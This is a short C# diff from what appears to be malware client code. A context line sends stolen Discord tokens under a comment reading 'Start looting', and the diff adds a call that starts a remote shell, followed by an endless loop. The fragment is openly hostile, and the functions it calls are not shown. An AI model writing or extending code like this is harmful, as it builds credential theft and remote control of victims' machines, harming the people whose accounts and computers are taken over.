@@ -84,6 +84,8 @@ namespace Client
             /// Start looting.
             Armitage.Cookies.Discord_Token.Send();
 
+            /// Start remote shell
+            Armitage.Shell.Start();
             while (true)
             {
                 // Sleep, useless, but...makes me feel confident
